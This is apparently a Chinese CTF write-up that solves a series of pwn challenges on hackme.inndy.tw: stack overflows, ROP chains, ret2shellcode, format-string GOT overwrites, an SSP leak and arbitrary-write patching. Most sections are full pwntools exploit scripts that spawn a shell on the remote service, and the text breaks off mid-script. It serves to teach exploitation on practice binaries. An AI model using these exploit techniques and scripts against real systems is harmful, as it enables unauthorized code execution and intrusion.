    <content type="text"><![CDATA[catflagnc 连接直接get shell homeosrk数组下标溢出，绕过canary保护直接修改ret地址为后门函数call_me_mabe 这里可以算出arr[14]为ret位置 exp: 1234567891011121314151617from pwn import *# p = process('./homework')p = remote('hackme.inndy.tw',7701)call_me = 0x80485FBprint str(call_me)pause()p.recvuntil('What\'s your name? ')p.sendline('n0va')p.recvuntil('4 &gt; dump all numbers\n')p.recvuntil(' &gt; ')p.sendline('1')p.recvuntil('Index to edit: ')p.sendline('14')p.recvuntil('How many? ')p.sendline(str(call_me))p.sendline('0')p.interactive() ROP栈溢出，而且是gets的栈溢出，溢出空间无限，可以随便写，这道题有很多种写法，这里选择system call execve的系统调用号为0xb,eax,放着系统调用号，ebx,ecx,edx分别放着execve的三个参数，先找一波gadget 123450x0806c943 : int 0x800x080b8016 : pop eax ; ret0x080481c9 : pop ebx ; ret0x080de769 : pop ecx ; ret0x0806ecda : pop edx ; ret 于是就可以构造ROP链进入系统 调用了 exp: 123456789101112131415161718192021222324252627#-*-coding:utf-8-*-from pwn import *p = process('./rop')p = remote("hackme.inndy.tw","7704")elf = ELF('./rop')bss_addr = elf.bss()pop_in_ecx = 0x0804b5bapop_eax = 0x080b8016pop_ebx = 0x080481c9pop_ecx = 0x080de769pop_edx = 0x0806ecdaint_0x80 = 0x0806c943payload = 16*'a'payload += p32(pop_ecx) + p32(bss_addr)#分两次将'/bin/sh'写入bss段payload += p32(pop_in_ecx) + '/bin'payload += p32(pop_ecx) + p32(bss_addr+4)payload += p32(pop_in_ecx) + '/sh\x00'payload += p32(pop_eax) + p32(0xb)#bss_addr放着'/bin/sh'做为execve的第一个参数payload += p32(pop_ebx) + p32(bss_addr)payload += p32(pop_ecx) + p32(0)payload += p32(pop_edx) + p32(0)payload += p32(int_0x80)p.sendline(payload)p.interactive() ROP2syscall()是系统调用函数，第一个参数是系统调用号，后面的函数分别为调用函数的参数，查表可知4为write函数的系统调用号，3为read函数的系统调用号，所以 123syscall(4, 1, v4, 42); == write(1,v4,42)syscall(3, 0, &amp;v1, 1024); == read(0,&amp;v1,1024)return syscall(4, 1, &amp;v1, 1024); == return write(1,&amp;v1,1024) read 这里就存在一个很明显的栈溢出了，我们可以控制程序回到syscall的位置，只要将他的4个参数分别设为(b,&#39;/bin/sh&#39;,0,0)就行了 exp: 1234567891011121314151617181920#-*-coding:utf-8-*-from pwn import *context.log_level = 'debug'# p = process('./rop2')p = remote("hackme.inndy.tw","7703")elf = ELF('./rop2')bss_addr = elf.bss()syscall = 0x8048320overflow = 0x8048454#先调用read往bss段写入'/bin/sh'payload = 16*'a'payload += p32(syscall) + p32(overflow)payload += p32(3) + p32(0) + p32(bss_addr) + p32(8)p.sendline(payload)p.send('/bin/sh\x00')#调用execve函数get shellpayload = 16*'a'payload += p32(syscall) + p32(0) + p32(0xb) + p32(bss_addr) + p32(0) + p32(0)p.sendline(payload)p.interactive() toooomuch可以看到有一个gets，而且还有一个print_flag函数直接打印flag，溢出跳转就完事了 exp: 123456789from pwn import *# context.log_level = 'debug'# p = process('./toooomuch')p = remote("hackme.inndy.tw","7702")print_flag = 0x804863Bpayload = 28*'a'payload += p32(print_flag)p.sendline(payload)p.interactive() toooomuch-2程序 跟toooomuch一模一样，但是这次要求get shell ，那就不能直接跳到print_flag函数上去了 因为什么保护都没开，所以可以直接ret2shellcode，思路是这样的，先跳到gets函数往bss段写入shellcode，再跳到bss执行shellcode exp: 123456789101112131415from pwn import *context.log_level = 'debug'# p = process('./toooomuch-2')p = remote("hackme.inndy.tw","7702")elf = ELF('./toooomuch-2')bss_addr = elf.bss()gets_addr = elf.plt['gets']shellcode = asm(shellcraft.sh())payload = 28*'a'#----------(覆盖返回地址) ---（gets的返回地址）--（gets的参数）payload += p32(gets_addr) + p32(bss_addr) + p32(bss_addr)p.recvuntil('Give me your passcode: ')p.sendline(payload)p.sendline(shellcode)p.interactive() echo这是一道格式化字符串，直接修改printf_got为system_plt的值就行了，都是已知值，手动修改（当然也可以用工具 : fmtstr_payload(7,{printf_got:system_plt})） exp: 123456789101112131415161718192021222324252627#-*-coding:utf-8-*-# 偏移为7from pwn import *# p = process('./echo')p = remote("hackme.inndy.tw","7711")elf = ELF('./echo')printf_got = elf.got['printf']system_plt = elf.plt['system']print "printf_got--&gt;" + hex(printf_got)print "system_plt--&gt;" + hex(system_plt) #0x8048400pause()payload = p32(printf_got) + p32(printf_got+1) + p32(printf_got+2) + p32(printf_got+3)'''\x00\x84\x04\x08'''payload += '%240c' + '%7$hhn' #0x100-16payload += '%132c' + '%8$hhn' #0x184-0x100payload += '%128c' + '%9$hhn' #0x204-0x184payload += '%4c' + '%10$hhn' #0x208-0x204print payloadpause()p.sendline(payload)p.sendline('/bin/sh\x00')p.interactive() echo264位的格式化字符串漏洞，漏点跟echo一样，不过有一些坑需要注意一下 首先是保护开启了PIE，位置无关的可执行程序，即可执行程序的代码指令集可以被加载到任意位置，进程通过相对地址获取指令操作和数据，如果不是位置无关的可执行程序，则该可执行程序的代码指令集必须放到特定的位置才可以运行进程。但是低两位字节是固定的，所以可以通过这个泄露出程序的基地址。 64位程序函数地址存在&#39;\x00&#39;截断，所以要将函数地址放在最后（不能用fmtstr_payload这个工具，它只适用于32位） printf处下断查看栈可以看到main+74和libc_start_main+340这两个可以泄漏的地址，偏移分别为41和43，因为开启了PIE，而且后三位不变，所以可以泄漏出程序基地址就是0x555555554a03-0xa03，之后对一切地址的操作都加上这个基地址就是正确的地址了，以及libc_start_main的真实地址0x7ffff7a2d830-240就可以算出偏移，从而得到其它函数的真空地址，比如system，不过这道题我用的是one_gadget一把梭 得到了真实地址和偏移就可以进行写入操作了，修改exit_got表为one_gadget_addr exp: 1234567891011121314151617181920212223242526272829303132333435363738#-*-coding:utf-8-*-from pwn import *context.log_level = 'debug'p = remote("hackme.inndy.tw","7712")# p = process('./echo2')elf = ELF('./echo2')libc = ELF("./libc-2.23.so.x86_64") #hackme网站下载# libc = elf.libc #本地libc#泄漏 main 地址 p.sendline('%41$p')elf_base = int(p.recv(),16)-0xa03print "elf_base--&gt;" + hex(elf_base)#泄漏 libc_start_main 地址 p.sendline('%43$p')libc_start_main = int(p.recv(),16)-240libc_base = libc_start_main - libc.symbols['__libc_start_main']print "libc_start_main--&gt;" + hex(libc_start_main)# one_gadget = 0xf02a4 + libc_base #本地one_gadgetone_gadget = 0xf0897+libc_base #远程one_gadgetprint "one_gadget--&gt;" + hex(one_gadget)exit_got = elf.got['exit'] + elf_baseprint "exit_got--&gt;" + hex(exit_got)hex_one_gadget = hex(one_gadget)payload1 = 4*'a'+'%'+str(int(hex_one_gadget[-4:],16)-4)+'c%8$hn'+p64(exit_got)# payload1 = '%'+str(int(hex_one_gadget[-4:],16))+'c%10$hn'+p64(exit_got)payload2 = 4*'a'+'%'+str(int(hex_one_gadget[-8:-4],16)-4)+'c%8$hn'+p64(exit_got+2)payload3 = 4*'a'+'%'+str(int(hex_one_gadget[-12:-8],16)-4)+'c%8$hn'+p64(exit_got+4)#下断# point = 0x984+elf_base# point = str(hex(point))# gdb.attach(p,"b *"+point)p.sendline(payload1)sleep(1)p.sendline(payload2)sleep(1)p.sendline(payload3)sleep(1)p.interactive() 这里解释一下4*’a&#39;：是为了最后的p64(exit_got)对齐，gdb下断看一个栈的分布就清楚了 ehco3还是格式化字符串，不过我们的输入不再是在栈中了，是保存在bss段，这就不好操作了，我们需要在栈中找到指向栈的指针来进行操作向栈写入内容（建议先做一下jarvis OJ的lab 9然后再回头来看这题，因为题型差不多，但是lab 9没有下面的蛇皮操作） 不过这题最坑的还是在hardfmt函数前的这个玩意v3 = alloca(16 * (((buf &amp; 0x3039u) + 30) / 0x10));看了大佬的 writeup 这是一个抬栈操作，我们回到汇编去可以看到，在最后esp会减去eax使得整个栈帧往栈顶移了eax，而且eax是个随机数，好在还是有范围的。 测试一下我们可以发现大概的范围： 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455import randomfor x in xrange(1,50): buf= random.randint(0,0xffffffff) a=16 * (((buf &amp; 0x3039) + 30) / 0x10) print hex(a)----------------------------------------------------------------------------------------------0x400x100x10300x200x30200x300x30300x30100x30200x10100x10100x20200x20200x200x30200x300x300x20400x30500x30500x20300x400x30300x30300x400x20200x30400x10300x30500x10400x400x30300x20300x200x30200x10400x30100x30300x400x20500x500x10200x30200x30300x400x30200x30400x30400x3020 可能的数值有0x10,0x20,0x30,0x40,0x1030,........等等等等，也就是说一个值对应一个栈帧，所以我们只需要确定eax的值就可以确定栈的分布了，在.text:08048774 sub esp, eax下断gdb调试一下： 这一次eax 的值 为0x2050,我把它设为0x20，进去，在printf 下个断点，c一下，就可以看到正确的栈帧了 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152Breakpoint *0x08048646pwndbg&gt; stack 5000:0000│ esp 0xffffcd00 —▸ 0x804a080 (buff) ◂— &apos;AAAAAAAA\n&apos;... ↓02:0008│ 0xffffcd08 ◂— 0x100003:000c│ 0xffffcd0c ◂— 0x104:0010│ 0xffffcd10 ◂— 0xbd5d204605:0014│ 0xffffcd14 —▸ 0x804829c ◂— add byte ptr [ecx + ebp*2 + 0x62], ch06:0018│ 0xffffcd18 —▸ 0xf7ffd918 ◂— 0x007:001c│ 0xffffcd1c ◂— 0x008:0020│ 0xffffcd20 —▸ 0xffffcd5e ◂— 0x3080409:0024│ 0xffffcd24 —▸ 0xf7e0b018 ◂— stosd dword ptr es:[edi], eax0a:0028│ 0xffffcd28 —▸ 0xf7e6021b (setbuffer+11) ◂— add ebx, 0x151de50b:002c│ 0xffffcd2c —▸ 0x80485d2 (hardfmt+12) ◂— add ebx, 0x1a2e0c:0030│ 0xffffcd30 —▸ 0xf7fe77eb (_dl_fixup+11) ◂— add esi, 0x158150d:0034│ 0xffffcd34 ◂— 0x00e:0038│ 0xffffcd38 —▸ 0xffffcd10 ◂— 0xbd5d20460f:003c│ 0xffffcd3c ◂— 0xc7e69f0010:0040│ 0xffffcd40 —▸ 0xffffcda8 ◂— 0x011:0044│ 0xffffcd44 —▸ 0x804a000 (_GLOBAL_OFFSET_TABLE_) —▸ 0x8049f10 (_DYNAMIC) ◂— 0x112:0048│ ebp 0xffffcd48 —▸ 0xffffcda8 ◂— 0x013:004c│ 0xffffcd4c —▸ 0x804877b (main+236) ◂— mov eax, 014:0050│ 0xffffcd50 —▸ 0x804a000 (_GLOBAL_OFFSET_TABLE_) —▸ 0x8049f10 (_DYNAMIC) ◂— 0x115:0054│ 0xffffcd54 —▸ 0x804a060 (magic) ◂— 0xbd5d204616:0058│ 0xffffcd58 —▸ 0xf7ed62ac (__close_nocancel+18) ◂— mov ebx, edx17:005c│ 0xffffcd5c —▸ 0x804874a (main+187) ◂— add esp, 0x1018:0060│ 0xffffcd60 ◂— 0x319:0064│ 0xffffcd64 —▸ 0x804a060 (magic) ◂— 0xbd5d20461a:0068│ 0xffffcd68 ◂— 0x41b:006c│ 0xffffcd6c —▸ 0x80486a6 (main+23) ◂— add ebx, 0x195a1c:0070│ 0xffffcd70 ◂— 0x80001d:0074│ 0xffffcd74 —▸ 0xf7fb2000 (_GLOBAL_OFFSET_TABLE_) ◂— 0x1b1db01e:0078│ 0xffffcd78 —▸ 0xffffce5c —▸ 0xffffd094 ◂— &apos;LC_PAPER=zh_CN.UTF-8&apos;1f:007c│ 0xffffcd7c —▸ 0xffffce54 —▸ 0xffffd05e ◂— 0x6d6f682f (&apos;/hom&apos;)20:0080│ 0xffffcd80 ◂— 0x1... ↓22:0088│ 0xffffcd88 —▸ 0xffffce5c —▸ 0xffffd094 ◂— &apos;LC_PAPER=zh_CN.UTF-8&apos;23:008c│ 0xffffcd8c ◂— 0x324:0090│ 0xffffcd90 ◂— 0x25d832425:0094│ 0xffffcd94 ◂— 0xdddfa71b26:0098│ 0xffffcd98 —▸ 0xffffce5c —▸ 0xffffd094 ◂— &apos;LC_PAPER=zh_CN.UTF-8&apos;27:009c│ 0xffffcd9c ◂— 0xc7e69f0028:00a0│ 0xffffcda0 —▸ 0xffffcdc0 ◂— 0x129:00a4│ 0xffffcda4 ◂— 0x0... ↓2b:00ac│ 0xffffcdac —▸ 0xf7e18637 (__libc_start_main+247) ◂— add esp, 0x102c:00b0│ 0xffffcdb0 —▸ 0xf7fb2000 (_GLOBAL_OFFSET_TABLE_) ◂— 0x1b1db0... ↓2e:00b8│ 0xffffcdb8 ◂— 0x02f:00bc│ 0xffffcdbc —▸ 0xf7e18637 (__libc_start_main+247) ◂— add esp, 0x1030:00c0│ 0xffffcdc0 ◂— 0x131:00c4│ 0xffffcdc4 —▸ 0xffffce54 —▸ 0xffffd05e ◂— 0x6d6f682f (&apos;/hom&apos;) 这里就以0x20的栈帧进行分析了，可以发现几个有用的地址 123456714:0050│ 0xffffcd50 —▸ 0x804a000 (_GLOBAL_OFFSET_TABLE_) —▸ 0x8049f10 (_DYNAMIC) ◂— 0x115:0054│ 0xffffcd54 —▸ 0x804a060 (magic) ◂— 0xbd5d2046...1e:0078│ 0xffffcd78 —▸ 0xffffce5c —▸ 0xffffd094 ◂— &apos;LC_PAPER=zh_CN.UTF-8&apos;1f:007c│ 0xffffcd7c —▸ 0xffffce54 —▸ 0xffffd05e ◂— 0x6d6f682f (&apos;/hom&apos;)...2b:00ac│ 0xffffcdac —▸ 0xf7e18637 (__libc_start_main+247) ◂— add esp, 0x10 偏移分别 为20,21,30,31,43，(这里规定它们分别为fmt20,fmt21,ebp1,ebp2) 而且偏移43处放着的是libc_start_main+247的地址，它的偏移是不变的，所以就可以用来做爆破的标志，来找到我们要的栈帧（exa = 0x20的栈帧） 123456789while True: # p = process('./echo3') p = remote("hackme.inndy.tw","7720") payload = '%43$p#%30$p' p.sendline(payload) data = p.recvuntil('#') if data[-4:-1] == '637': break p.close() 爆破完成之后就可以进行正常的操作了思路如下 ： 通过libc_start_main算出偏移，进而得到system的真实地址 %n操作 30，10偏移处使ebp1指向fmt20，ebp2指向fmt21 %n操作 ebp1使fmt20的内容修改为exit_got 操作 ebp2 使fmt21的内容修改为exit_got+2 %n操作 fmt20 修改exit_got 为system低4位，操作 fmt21 修改exit_got+2为system高4位 发送&#39;/bin/sh&#39;作为system函数的参数 完整exp: 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960#-*-coding:utf-8-*-from pwn import *context.log_level = 'debug'elf = ELF('./echo3')# libc = elf.libclibc = ELF('./libc-2.23.so.i386')while True: # p = process('./echo3') p = remote("hackme.inndy.tw","7720") payload = '%43$p#%30$p' p.sendline(payload) data = p.recvuntil('#') if data[-4:-1] == '637': break p.close()libc_start_main = int(data[:-1],16)-247ebp1 = int(p.recv()[:-1],16) #在偏移为 31 (ebp1的偏移为87)print 'libc_start_main--&gt;' + hex(libc_start_main)print 'ebp1--&gt;' + hex(ebp1)fmt20 = ebp1-0x10cfmt21 = ebp1-0x108offset = libc_start_main - libc.symbols['__libc_start_main']system_addr = offset + libc.symbols['system']print 'system_addr--&gt;' + hex(system_addr)print 'libc_system--&gt;' + hex(libc.symbols['system'])pause()# exit_got = elf.got['exit']# print 'exit_got--&gt;' + hex(exit_got)printf_got = elf.got['printf']print 'printf_got--&gt;' + hex(printf_got)#%n操作 30,31偏移处使ebp1指向 fmt20 ebp2指向 fmt21payload_1 = '%'+str(fmt20&amp;0xffff)+'c%30$hn'payload_1 += '%4c%31$hn'payload_1 += '1111'# gdb.attach(p,"b *0x08048646")# pause()p.sendline(payload_1)#%n操作 ebp1使fmt20内容修改为exit_got,操作 ebp2使fmt21内容修改为exit_got+2payload_2 = '%'+str(printf_got&amp;0xffff)+'c%85$hn'payload_2 += '%2c%87$hn'payload_2 += '2222'# gdb.attach(p,"b *0x08048646")# pause()p.recvuntil('1111\n')p.sendline(payload_2)#%n操作 fmt20修改exit_got为system低4位 fmt21修改为exit_got+2为system高4位payload_3 = '%'+str((system_addr&gt;&gt;16)&amp;0xff)+'c%20$hhn'payload_3 += '%'+str((system_addr&amp;0xffff)-((system_addr&gt;&gt;16)&amp;0xff))+'c%21$hn' payload_3 += '3333'# gdb.attach(p,"b *0x08048646")# pause()p.recvuntil('2222\n')p.sendline(payload_3)p.recv()p.recvuntil('3333\n')p.send('/bin/sh\x00')p.interactive() smash-the-stack这题是利用ssp报错的方法泄漏出flag，在ctf-wiki中有介绍：Stack smash 只要将argv[0]覆盖为存放flag的地址即可，在write处下断查看argvp[0]的偏移 1234567891011121314151617181920212223pwndbg&gt; stack 2000:0000│ esp 0xffffcd70 ◂— 0x101:0004│ 0xffffcd74 —▸ 0xffffcd88 ◂— 0x31313131 (&apos;1111&apos;)02:0008│ 0xffffcd78 ◂— &apos;1111&apos;03:000c│ 0xffffcd7c ◂— 0x004:0010│ 0xffffcd80 ◂— 0x105:0014│ 0xffffcd84 —▸ 0xffffce44 —▸ 0xffffd046 ◂— 0x6d6f682f (&apos;/hom&apos;)06:0018│ ebx ecx 0xffffcd88 ◂— 0x31313131 (&apos;1111&apos;)07:001c│ 0xffffcd8c ◂— 0xc7f80a3208:0020│ 0xffffcd90 —▸ 0xffffcdb0 ◂— 0x109:0024│ 0xffffcd94 ◂— 0x0... ↓0b:002c│ 0xffffcd9c —▸ 0xf7e18637 (__libc_start_main+247) ◂— add esp, 0x100c:0030│ 0xffffcda0 —▸ 0xf7fb2000 (_GLOBAL_OFFSET_TABLE_) ◂— 0x1b1db0... ↓0e:0038│ 0xffffcda8 ◂— 0x00f:003c│ 0xffffcdac —▸ 0xf7e18637 (__libc_start_main+247) ◂— add esp, 0x1010:0040│ 0xffffcdb0 ◂— 0x111:0044│ 0xffffcdb4 —▸ 0xffffce44 —▸ 0xffffd046 ◂— 0x6d6f682f (&apos;/hom&apos;)12:0048│ 0xffffcdb8 —▸ 0xffffce4c —▸ 0xffffd084 ◂— &apos;LC_PAPER=zh_CN.UTF-8&apos;13:004c│ 0xffffcdbc ◂— 0x0pwndbg&gt; distance 0xffffce44 0xffffcd880xffffce44-&gt;0xffffcd88 is -0xbc bytes (-0x2f words) exp: 123456789from pwn import *context.log_level = 'debug'# p = process('./smash')p = remote('hackme.inndy.tw',7717)flag_addr = 0x804A060p.recvuntil('the flag')p.sendline(47*'a'+p32(flag_addr))# p.sendline(48*p32(flag_addr))p.interactive() 还有另一种做法就是不用算偏移，直接塞一大把p32(flag_addr)进去，因为只要覆盖到argv[0]的位置就可以了，但是实践表明，如果这个数差偏移太多的话，也是不太行的。（比如上面的塞100个在本地还是可以的，但是远程的话63个以上就已经不正常了，我猜是覆盖到了___stack_chk_fail函数部分导致函数无法正常执行，也就不存在通过___stack_chk_fail函数打印出flag了） onepunch这道题还是挺有趣的，起初看反编译代码不是很理解 v6 跟v4的关系，但是在汇编中就很直观了，v6是地址，v4是写入的内容，也就是任意地址写 还有就是这个程序的text段居然是可写的，结合上面的任意地址写就意味着我们可以修改程序的逻辑实现各种操作，相当于打patch 再看一下main函数：这里对输入的v4进行判断，如果不等于255就跳到400773处，所以我们只需要在这里打patch使其跳到main函数就可以实现无限输入。 1234567.text:0000000000400756 mov rax, [rbp+v6].text:000000000040075A mov edx, [rbp+v4].text:000000000040075D mov [rax], dl.text:000000000040075F ; 14: if ( v4 == 255 ).text:000000000040075F mov eax, [rbp+v4].text:0000000000400762 cmp eax, 0FFh.text:0000000000400767 jnz short loc_400773 这里就需要修改16进制了，IDA-&gt;options 将Number of opcode bytes(non-graph)的值设为16就可以看到汇编对应的16进制数。接下来算偏移，要从0x400769跳跟0x4006f1偏移应该为0x88 = 136，所以第一步就是将0x400768处的0xA修改为0x88 123456p.recvuntil('Where What?')# gdb.attach(p,"b *0x400741")# pause()p.sendline('0x400768')# sleep(0.1)p.sendline('138') 接下来往text段写入shellcode，写完后再修改0x400768处为shellcode地址即可 完整exp: 123456789101112131415161718192021222324252627#-*-coding:utf-8-*-from pwn import *# p = process('./onepunch')p = remote("hackme.inndy.tw","7718")context.log_level = 'debug'p.recvuntil('Where What?')# gdb.attach(p,"b *0x400741")# pause()p.sendline('0x400768')# sleep(0.1)p.sendline('138')shell_addr = 0x400790# shellcode = asm(shellcraft.sh())shellcode = "\x6a\x3b\x58\x99\x52\x48\xbb\x2f\x2f\x62\x69\x6e\x2f\x73\x68\x53\x54\x5f\x52\x57\x54\x5e\x0f\x05" shell_len = len(shellcode)i = 0while i&lt;shell_len: p.recvuntil('Where What?') p.sendline(str(hex(shell_addr+i))) # sleep(0.1) p.sendline(str(ord(shellcode[i]))) i += 1p.recvuntil('Where What?')p.sendline('0x400768')# sleep(0.1)p.sendline('39')p.interactive() tictactoe-1 每次可以写入一个字节，所以就很容易可以想到，把puts的got表修改成0x08048C46(cat flag的位置)，就可以拿到flag_simple了 exp: 123456789101112131415161718192021222324252627282930313233#-*-coding:utf-8-*-from pwn import *context.log_level = 'debug'# p = process('./tictactoe')p = remote("hackme.inndy.tw","7714")puts_got = 0x804B024# -50distance_addr = 0x8048C46p.recvuntil('Play (1)st or (2)nd? ')p.sendline('1')p.recvuntil('Input move (9 to change flavor): ')p.sendline('9')sleep(0.1)p.sendline('\x46')p.recvuntil('Input move (9 to change flavor): ')p.sendline('-50')p.recvuntil('Input move (9 to change flavor): ')p.sendline('9')sleep(0.1)p.sendline('\x8c')p.recvuntil('Input move (9 to change flavor): ')# gdb.attach(p,"b *0x08048A71")# pause()p.sendline('-49')p.recvuntil('Input move (9 to change flavor): ')p.sendline('9')sleep(0.1)p.sendline('\x04')p.recvuntil('Input move (9 to change flavor): ')p.sendline('-48')p.interactive() rsbo-2 栈溢出漏洞，程序中又有write函数，所以其实很清晰了，利用write函数泄漏出read的真实地址进而得到system的真实地址再跳转到去就可以get shell 了，但是这里有一个坑需要说一下，就是垃圾字符要用\x00去填充而不是用’a’啊啥的这些 因为len(buf)在栈中的位置跟buf的重叠的，所以当我们有字母去填充时，会导致 v8的值出错，这样程序就会崩溃退出 用\x00填的时候才会正常，接下来的操作不用多说了 exp: 12345678910111213141516171819202122232425262728293031323334353637#-*-coding:utf-8-*-# get shell 脚本from pwn import *# p = process('./rsbo')p = remote("hackme.inndy.tw","7706")elf = ELF('./rsbo')# libc = elf.libclibc = ELF('./libc-2.23.so.i386')context.log_level = 'debug'main = 0x804867Fread_plt = elf.plt['read']read_got = elf.got['read']open_plt = elf.plt['open']write_plt = elf.plt['write']bss = elf.bss()# write(1,read_got,4)payload_2 = p32(0)*27 + p32(write_plt) + p32(main) + p32(1) + p32(read_got) + p32(4)print hex(len(payload_2))# gdb.attach(p,"b *0x0804867d")# pause()p.send(payload_2)read_addr = u32(p.recv(4))print "read_addr --&gt; " + hex(read_addr)offset = read_addr - libc.symbols['read']system_addr = offset + libc.symbols['system']bin_libc = libc.search("/bin/sh").next()bin_addr = bin_libc + offsetprint "system_addr --&gt; " + hex(system_addr)print "bin_addr --&gt; " + hex(bin_addr)# pause()# 回到 mainpayload_3 = p32(0)*25 + p32(system_addr) + p32(0) + p32(bin_addr)# gdb.attach(p,"b *0x0804867d")# pause()p.send(payload_3)p.interactive() rsbo1其实我是用的rsbo2的脚本直接拿到两题的flag再回过头来用open的方法做rsbo1，因为我一直在纳闷open返回的指针怎么获取给read用，但是后来问了师兄才知道了read的第一个参数的妙处： 关于read的第一个参数read(fd,buf,size) 为0时表示标准输入流（键盘)，为1时表示标准输出流（屏幕）(1一般是用在write吧)，为2时表示错误信息输出，为3之后表示文件流依次表示第一个open的文件第二个，第三个…….（如果同时打开多个文件的话） 所以open(“/home/ctf/flag”)后可以直接调用read(3,bss,0x60)再write就可以把flag打印出来的 还有个坑，在open这里虽然它只需要一个参数，但是它并不只有一个参数，我们要保证它的其实参数为0才能正常调用 exp: 1234567891011121314151617181920212223242526272829303132333435#-*-coding:utf-8from pwn import *context.log_level = 'debug'p = process('./rsbo')# p = remote("hackme.inndy.tw","7706")elf = ELF('./rsbo')open_plt = elf.plt['open']read_plt = elf.plt['read']write_plt = elf.plt['write']main = 0x804867Fstart = 0x08048490flag_addr = 0x80487D0bss = elf.bss()# fd = open("/home/ctf/flag")# read(fd,buf,0x10)# write(1,buf,0x10)#open("/home/ctf/flag")payload_1 = p32(0)*27 + p32(open_plt) + p32(start) + p32(flag_addr) + p32(0)gdb.attach(p,"b *0x804867D")pause()p.send(payload_1)#read(fd,buf,0x10)payload_2 = p32(0)*27 + p32(read_plt) + p32(start)payload_2 += p32(0x3) + p32(bss) + p32(0x60)# gdb.attach(p,"b *0x804867D")# pause()p.send(payload_2)#write(1,buf,0x10)payload_3 = p32(0)*27 + p32(write_plt) + p32(0)payload_3 += p32(1) + p32(bss) + p32(0x60)# gdb.attach(p,"b *0x804867D")# pause()p.send(payload_3)p.interactive() stack这题还是挺有意思的，程序主要做的事就是模拟一个栈的push，pop操作，并将自己模拟的栈放在函数栈帧中， 上图为栈的分布，我们可以看到，自己构造的esp也同样放在栈中，那么我们就可以通过pop,push操作控制esp的位置实现任意地址读，写，思路如下 ： 将esp指向esp所以在位置的上方，push写入改变esp指向libc_start_main+247的位置 pop出libc_start_main+247的值，利用偏移算出system及&quot;/bin/sh&quot;的真实地址 继续控制esp指向main的ret地址位置，修改为system的地址，以及参数&quot;/bin/sh&quot; x 退出即可get shell 好了，接下来详细讲一下过程以及上图是怎么来的 这是IDA反编译出来的东西，我看着是看不出什么有用的信息的，建议看汇编，如果单纯汇编很难看懂的话，可以跟着gdb一步步调试来理解，那我们看汇编 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950.text:000006F0 public stack_push.text:000006F0 stack_push proc near ; CODE XREF: main+DC↓p.text:000006F0.text:000006F0 arg_0 = dword ptr 8.text:000006F0 arg_4 = dword ptr 0Ch.text:000006F0.text:000006F0 ; __unwind &#123; .text:000006F0 push ebp.text:000006F1 mov ebp, esp.text:000006F3 ; 4: result = *a1;.text:000006F3 call __x86_get_pc_thunk_ax.text:000006F8 add eax, 18C8h.text:000006FD mov eax, [ebp+arg_0].text:00000700 mov eax, ds:(_GLOBAL_OFFSET_TABLE_ - 1FC0h)[eax].text:00000702 ; 5: *a1 += (int)&amp;(&amp;GLOBAL_OFFSET_TABLE_)[-254] + 1;.text:00000702 lea ecx, (_GLOBAL_OFFSET_TABLE_+1 - 1FC0h)[eax].text:00000705 mov edx, [ebp+arg_0].text:00000708 mov [edx], ecx.text:0000070A ; 6: a1[result + 1] = a2;.text:0000070A mov edx, [ebp+arg_0].text:0000070D mov ecx, [ebp+arg_4].text:00000710 mov [edx+eax*4+4], ecx.text:00000714 ; 7: return result;.text:00000714 nop.text:00000715 pop ebp.text:00000716 retn----------------------------------------------------------------------------------------------.text:00000717 public stack_pop.text:00000717 stack_pop proc near ; CODE XREF: main+10C↓p.text:00000717.text:00000717 arg_0 = dword ptr 8.text:00000717.text:00000717 ; __unwind &#123;.text:00000717 push ebp.text:00000718 mov ebp, esp.text:0000071A call __x86_get_pc_thunk_ax.text:0000071F add eax, 18A1h.text:00000724 mov eax, [ebp+arg_0].text:00000727 mov eax, ds:(_GLOBAL_OFFSET_TABLE_ - 1FC0h)[eax].text:00000729 lea edx, (unk_1FBF - 1FC0h)[eax].text:0000072C mov eax, [ebp+arg_0].text:0000072F mov ds:(_GLOBAL_OFFSET_TABLE_ - 1FC0h)[eax], edx.text:00000731 mov eax, [ebp+arg_0].text:00000734 mov edx, ds:(_GLOBAL_OFFSET_TABLE_ - 1FC0h)[eax].text:00000736 mov eax, [ebp+arg_0].text:00000739 mov eax, ds:(dword_1FC4 - 1FC0h)[eax+edx*4].text:0000073D pop ebp.text:0000073E retn.text:0000073E ; &#125; // starts at 717.text:0000073E stack_pop endp 可以看到，在进行push操作的时候mov [edx+eax*4+4], ecx是与ecx有关，pop的时候mov eax, ds:(dword_1FC4 - 1FC0h)[eax+edx*4]也是跟exc有关，到gdb里看一波 可以看到ecx存的是push的值（我输入的是123=0x7b）eax是与ebp的偏移（将初始esp看成ebp吧），edx是ebp，这里应该就能看出一开始给的图的上半部分了吧 单步一下可以看到我们push的值已经入栈，push的操作明白了我们来看一下pop的操作 因为我们已经先push一个0x7b，所以这次pop指向的就是0xffffcc4c处的0x7b并且esp更新为0(-1)，这就是pop的过程，理清这两个过程就可以来实现上面的4个思路了 首先要修改esp的值就是先将esp指向esp的上方，即0xffffcc44处，初始esp是指向0xffffcc48，所以只需要pop一下就可以了，然后就是修改esp的值 ，用push，修改为多少呢 修改esp指向libc_start_main的位置，也就是0x59 = 89，之后再用pop将地址泄漏出来，进而算出偏移，得到system跟&#39;/bin/sh&#39;的地址，得到地址之后就要找到main函数的返回地址，覆盖为system 我们再往下看多一点栈的内容，回到main，在0x8fb处下个断点，单步往下 看到这个栈帧是不是很熟悉，继续单步到ret处查看栈 对比一下可以很清楚的发现main函数的返回地址是第二个的libc_start_main而不是我们用来泄漏地址的位置，这就是一开始那张图的下半部分了，好了，那开始覆盖：将0xffffcdbc覆盖为system_addr，将0xffffcdc4覆盖为binsh_addr 写入的时候用还是跟泄漏地址时一样的做法，先将esp指向其上方，然后用push压入相应值 不过这里要注意的是，scanf的格式化字符是%d，它能接收的最大值是0x7fffffff而我们要写入的真实地址都是0xf7开头的，明显太大，所以我们要用负数去写，0xffffffff == -1，0xfffffffe == -2这样子就能写入我们要的真实地址了 exp: 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152#-*-coding:utf-8-*-from pwn import *# p = process('./stack')p = remote("hackme.inndy.tw","7716")elf = ELF('./stack')# libc = elf.libclibc = ELF('./libc-2.23.so.i386')context.log_level = 'debug'p.recvuntil('Cmd &gt;&gt;\n')p.sendline('p')p.recvuntil('Cmd &gt;&gt;\n')# 泄漏libc_start_mainp.sendline('i\n89')p.recvuntil('Cmd &gt;&gt;\n')p.sendline('p')p.recvuntil('Pop 